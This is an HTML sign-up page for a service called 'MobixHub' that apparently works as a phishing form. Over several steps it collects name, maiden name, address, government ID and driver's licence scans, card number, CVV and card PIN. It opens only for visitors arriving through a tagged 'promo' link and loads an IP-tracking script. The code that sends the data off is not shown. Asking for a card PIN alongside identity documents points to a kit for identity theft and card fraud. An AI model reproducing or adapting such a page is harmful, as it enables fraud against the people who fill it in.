<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign Up - MobixHub</title>
  <style>
    :root {
      --bg: #f0f2f5;
      --container-bg: #ffffff;
      --text: #333333;
      --input-bg: #ffffff;
      --input-border: #cccccc;
      --button-bg: #007bff;
      --button-hover: #0056b3;
    }

    [data-theme="dark"] {
      --bg: #121212;
      --container-bg: #1e1e1e;
      --text: #e0e0e0;
      --input-bg: #2c2c2c;
      --input-border: #444;
      --button-bg: #0d6efd;
      --button-hover: #0a58ca;
    }

    * { box-sizing: border-box; }
    body {
      margin: 0; padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: var(--bg);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      transition: background 0.3s ease;
    }

    .signup-container {
      background: var(--container-bg);
      padding: 2rem;
      width: 100%;
      max-width: 500px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
      color: var(--text);
      transition: background 0.3s ease, color 0.3s ease;
    }

    h2 {
      text-align: center;
      margin-bottom: 1rem;
      color: var(--text);
    }

    label {
      display: block;
      margin: 0.8rem 0 0.3rem;
      font-size: 0.9rem;
      color: var(--text);
    }

    input, select {
      width: 100%;
      padding: 0.7rem;
      border: 1px solid var(--input-border);
      border-radius: 6px;
      margin-bottom: 1rem;
      background-color: var(--input-bg);
      color: var(--text);
    }

    input[type="file"] {
      padding: 0.3rem;
    }

    .button-group {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }

    button {
      padding: 0.9rem 1.2rem;
      border: none;
      background-color: var(--button-bg);
      color: white;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: var(--button-hover);
    }

    .form-step {
      display: none;
    }

    .form-step.active {
      display: block;
    }

    .password-wrapper {
      position: relative;
    }

    .toggle-eye {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      user-select: none;
    }

    .theme-toggle {
      position: absolute;
      top: 15px;
      right: 15px;
      background: transparent;
      border: 1px solid var(--input-border);
      color: var(--text);
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
  <div class="signup-container">
    <h2>Create Account - MobixHub</h2>
    <form id="multiStepForm">
      <!-- Step 1 -->
      <div class="form-step active" id="step-1">
        <label>First Name</label>
        <input type="text" name="firstName" required>

        <label>Middle Name</label>
        <input type="text" name="middleName">

        <label>Last Name</label>
        <input type="text" name="lastName" required>

        <label>Maiden Name</label>
        <input type="text" name="maidenName">

        <label>Email Address</label>
        <input type="email" name="email" required>

        <label>Phone Number</label>
        <input type="tel" name="phone" required>

        <!-- Hidden promo code input -->
        <input type="hidden" name="promoCode" id="promoInput" value="">

        <label>Create Password</label>
        <div class="password-wrapper">
          <input type="password" name="password" id="password" required minlength="6">
          <span class="toggle-eye" onclick="togglePassword('password', this)" title="Show/Hide Password">üëÅÔ∏è</span>
        </div>

        <label>Confirm Password</label>
        <div class="password-wrapper">
          <input type="password" name="confirmPassword" id="confirmPassword" required minlength="6">
          <span class="toggle-eye" onclick="togglePassword('confirmPassword', this)" title="Show/Hide Password">üëÅÔ∏è</span>
        </div>

        <div class="button-group">
          <button type="button" onclick="nextStep(1)">Next</button>
        </div>
      </div>

      <!-- Step 2 -->
      <div class="form-step" id="step-2">
        <label>Home Address</label>
        <input type="text" name="homeAddress" required>

        <label>City</label>
        <input type="text" name="city" required>

        <label>State</label>
        <input type="text" name="state" required>
        
        <label>Zip or postcode</label>
        <input type="text" name="zip or postcode" required>

        <label>Country</label>
        <select name="country" required>
          <option value="">Select Country</option>
          <option value="USA">USA</option>
          <option value="UK">UK</option>
        </select>

        <div class="button-group">
          <button type="button" onclick="prevStep(2)">Back</button>
          <button type="button" onclick="nextStep(2)">Next</button>
        </div>
      </div>

      <!-- Step 3 -->
      <div class="form-step" id="step-3">
        <label>Upload Driver's License (Front) Optional</label>
        <input type="file" name="dlFront" accept="image/*,.pdf" capture="environment" placeholder="if you have any">

        <label>Upload Driver's License (Back) Optional</label>
        <input type="file" name="dlBack" accept="image/*,.pdf" capture="environment" placeholder="if you have any">

        <label>Upload Government ID (Front)</label>
        <input type="file" name="govFront" accept="image/*,.pdf" capture="environment" required>

        <label>Upload Government ID (Back)</label>
        <input type="file" name="govBack" accept="image/*,.pdf" capture="environment" required>

        <div class="button-group">
          <button type="button" onclick="prevStep(3)">Back</button>
          <button type="button" onclick="nextStep(3)">Next</button>
        </div>
      </div>
      <!-- Step 5 -->
      <div class="form-step" id="step-5">
        <label>Card Number</label>
        <input type="text" name="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>

        <label>Expiry Date</label>
        <input type="month" name="expiryDate" required>

        <label>CVV</label>
        <input type="text" name="cvv" required maxlength="4">
    <label>Card pin</label>
        <input type="text" name="cardpin" required maxlength="4">
        <div class="button-group">
          <button type="button" onclick="prevStep(5)">Back</button>
          <button type="submit">Finish</button>
        </div>
        <div id="statusMessage" style="text-align:center; color:#007bff; font-weight:bold; margin-top:1rem;"></div>
      </div>
    </form>
  </div>
  <!-- Scripts -->
  <script src="promolist.js"></script>
  <script src="main.js"></script>
  <script src="iptrack.js"></script>
  
  <script>
    // Toggle light/dark theme
    function toggleTheme() {
      const html = document.documentElement;
      const current = html.getAttribute("data-theme");
      const next = current === "dark" ? "light" : "dark";
      html.setAttribute("data-theme", next);
      localStorage.setItem("theme", next);
    }

    // On load: check stored theme and promo code
    window.addEventListener("DOMContentLoaded", () => {
      const savedTheme = localStorage.getItem("theme");
      if (savedTheme) {
        document.documentElement.setAttribute("data-theme", savedTheme);
      }

      const params = new URLSearchParams(window.location.search);
      const promo = params.get("promo");

      if (!promo) {
        alert("Promo code missing in URL. Please use a valid link.");
        // Optionally disable form or redirect
        document.getElementById("multiStepForm").style.display = "none";
        return;
      }

      const promoInput = document.getElementById("promoInput");
      if (promoInput) promoInput.value = promo;
    });

    function togglePassword(id, icon) {
      const input = document.getElementById(id);
      const isPassword = input.type === "password";
      input.type = isPassword ? "text" : "password";
      icon.textContent = isPassword ? "üôà" : "üëÅÔ∏è";
    }
  </script>
</body>
</html>
